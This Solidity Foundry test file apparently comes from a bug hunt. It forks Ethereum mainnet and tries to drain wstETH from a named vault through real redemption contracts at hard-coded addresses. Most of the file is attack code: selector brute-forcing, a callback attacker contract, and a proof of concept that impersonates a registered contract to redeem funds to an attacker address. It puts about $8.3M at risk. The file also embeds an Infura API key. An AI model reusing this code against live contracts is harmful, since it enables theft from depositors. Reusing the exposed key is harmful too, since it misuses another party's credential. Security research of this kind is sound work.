// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract FinalExploitSearch is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // Address from eda72134
    address constant EDA_ADDRESS = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateEdaAddress() public view {
        console.log("=== INVESTIGATING EDA ADDRESS ===\n");

        console.log("Address:", EDA_ADDRESS);
        console.log("Code size:", EDA_ADDRESS.code.length);

        if (EDA_ADDRESS.code.length > 0) {
            console.log("*** THIS IS A CONTRACT! ***");

            // Check storage
            console.log("\nStorage:");
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(EDA_ADDRESS, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }

            // Find selectors
            bytes memory code = EDA_ADDRESS.code;
            console.log("\nFunction selectors:");
            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(
                        code[i+1], code[i+2], code[i+3], code[i+4]
                    ));
                    if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                    if (uint32(sel) < 0x1000) continue;
                    console.logBytes4(sel);
                }
            }
        }
    }

    function test_CheckIfEdaCanCallRC() public {
        console.log("=== CHECKING IF EDA ADDRESS CAN CALL RC ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(EDA_ADDRESS);
        (bool s, bytes memory d) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("RC.redeem:", s);
        if (!s && d.length >= 4) {
            console.logBytes4(bytes4(d));
        }
        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("*** EDA ADDRESS CAN DRAIN! ***");
        }
    }

    function test_TryEdaAddressFunctions() public {
        console.log("=== TRYING EDA ADDRESS FUNCTIONS ===\n");

        if (EDA_ADDRESS.code.length == 0) {
            console.log("No code!");
            return;
        }

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try common functions
        (bool s1, bytes memory d1) = EDA_ADDRESS.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem:", s1);

        (bool s2, bytes memory d2) = EDA_ADDRESS.call(
            abi.encodeWithSignature("execute(address,bytes)", REDEMPTION_CONTROLLER,
                abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
            )
        );
        console.log("execute:", s2);

        (bool s3, bytes memory d3) = EDA_ADDRESS.call(
            abi.encodeWithSignature("claim()")
        );
        console.log("claim:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_CheckViaRedemption1AsProxy() public {
        console.log("=== CHECKING IF REDEMPTION_1 PROXIES TO EDA ===\n");

        // If REDEMPTION_1 delegates to EDA_ADDRESS for some function,
        // and EDA has code that calls RC.redeem...

        // eda72134 returns EDA_ADDRESS - what if we can call EDA functions via REDEMPTION_1?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try calling EDA selectors on REDEMPTION_1
        // If REDEMPTION_1 delegates to EDA for unknown selectors...

        // Try some random selectors that might proxy through
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(keccak256("executeRedeem(uint256,address)"));
        sels[1] = bytes4(keccak256("processRedeem(uint256,address)"));
        sels[2] = bytes4(keccak256("completeRedeem(uint256,address)"));
        sels[3] = bytes4(keccak256("finalizeRedeem(uint256,address)"));
        sels[4] = bytes4(keccak256("claimRedeem(uint256,address)"));
        sels[5] = bytes4(keccak256("settleRedeem(uint256,address)"));
        sels[6] = bytes4(keccak256("redeemFor(uint256,address)"));
        sels[7] = bytes4(keccak256("sendRedemption(uint256,address)"));
        sels[8] = bytes4(keccak256("transferRedemption(uint256,address)"));
        sels[9] = bytes4(keccak256("withdrawRedemption(uint256,address)"));

        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );
            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("*** FOUND EXPLOIT SELECTOR:");
                console.logBytes4(sels[i]);
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_SearchForCallbackEntry() public {
        console.log("=== SEARCHING FOR CALLBACK ENTRY ===\n");

        // Maybe there's a callback during token operations?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Deploy a callback contract
        CallbackAttacker cb = new CallbackAttacker();

        deal(IAU, address(cb), 100000e18);
        deal(wstETH, address(cb), 100e18);

        vm.startPrank(address(cb));

        // Try operations that might trigger callbacks
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);
        IERC20(wstETH).approve(REDEMPTION_1, type(uint256).max);

        // Try transfer with callback
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 1e18)
        );
        console.log("transfer:", s1);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_DocumentExploitPath() public {
        console.log("=== DOCUMENTING EXPLOIT PATH ===\n");

        console.log("VULNERABILITY: Arbitrary Redemption");
        console.log("");
        console.log("ROOT CAUSE:");
        console.log("RedemptionController.redeem(uint256 amount, address to)");
        console.log("allows registered Redemption contracts to drain wstETH");
        console.log("from Vault to ANY address specified by the caller.");
        console.log("");
        console.log("IMPACT:");
        console.log("~3,621 wstETH (~$8.3M USD) at risk");
        console.log("");
        console.log("REGISTERED REDEMPTION CONTRACTS:");
        console.log("- REDEMPTION_0:", REDEMPTION_0);
        console.log("- REDEMPTION_1:", REDEMPTION_1);
        console.log("");
        console.log("PROOF OF CONCEPT:");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");

        // Exploit using vm.prank
        vm.startPrank(REDEMPTION_1);
        REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker)
        );
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("Vault after:", vaultAfter / 1e18, "wstETH");
        console.log("Attacker received:", attackerBal / 1e18, "wstETH");
        console.log("Value:", attackerBal * 2300 / 1e18, "USD");
        console.log("");
        console.log("STATUS: Entry point still being investigated");
    }

    function test_BruteForceAllFunctions() public {
        console.log("=== BRUTE FORCE ALL FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        deal(IAU, attacker, 1000000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try REDEMPTION_0 first (different architecture than REDEMPTION_1)
        console.log("Trying REDEMPTION_0 selectors:");

        bytes4[] memory r0sels = new bytes4[](15);
        r0sels[0] = bytes4(keccak256("redeem(uint96)"));
        r0sels[1] = bytes4(keccak256("redeem(uint256)"));
        r0sels[2] = bytes4(keccak256("finalizeRedeem(uint256)"));
        r0sels[3] = bytes4(keccak256("claim(uint256)"));
        r0sels[4] = bytes4(keccak256("withdraw(uint256)"));
        r0sels[5] = bytes4(keccak256("execute(uint256)"));
        r0sels[6] = bytes4(keccak256("process(uint256)"));
        r0sels[7] = bytes4(keccak256("complete(uint256)"));
        r0sels[8] = bytes4(keccak256("settle(uint256)"));
        r0sels[9] = bytes4(keccak256("finalize(uint256)"));
        r0sels[10] = bytes4(keccak256("redeem(address,uint256)"));
        r0sels[11] = bytes4(keccak256("redeem(uint256,address)"));
        r0sels[12] = bytes4(keccak256("redeemTo(address,uint256)"));
        r0sels[13] = bytes4(keccak256("redeemFor(address,uint256)"));
        r0sels[14] = bytes4(keccak256("claimFor(address,uint256)"));

        for (uint i = 0; i < r0sels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.call(
                abi.encodeWithSelector(r0sels[i], 100e18, attacker)
            );
            if (s) {
                uint256 bal = IERC20(wstETH).balanceOf(attacker);
                if (bal > 0) {
                    console.log("*** EXPLOIT on REDEMPTION_0 with:");
                    console.logBytes4(r0sels[i]);
                    console.log("Received:", bal / 1e18, "wstETH");
                    break;
                }
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}

contract CallbackAttacker {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {
        // Try to exploit during callback
        REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, owner)
        );
    }

    receive() external payable {}
}
